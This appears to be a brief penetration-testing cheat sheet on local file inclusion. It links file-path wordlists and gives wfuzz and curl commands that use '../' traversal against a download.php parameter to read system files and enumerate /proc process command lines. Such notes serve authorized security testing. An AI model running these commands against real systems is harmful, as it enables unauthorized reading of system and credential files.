### :open_file_folder: Check file

lists

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt

https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt

https://github.com/carlospolop/Auto_Wordlists/blob/main/custom_wordlists/file_inclusion_linux.txt

Check files

```
wfuzz -c -w file_inclusion_linux.txt --hw 0 http://<target ip>/download.php?downloadurl=../../../../../../../FUZZ
```

### :open_file_folder: [Proc File System](https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/)

```
wfuzz -u http://<target ip>/download.php?downloadurl=/proc/FUZZ/cmdline -z range,1-1000 --hw 1

curl http://<target ip>/download.php?downloadurl=/proc/824/cmdline --output service.txt
```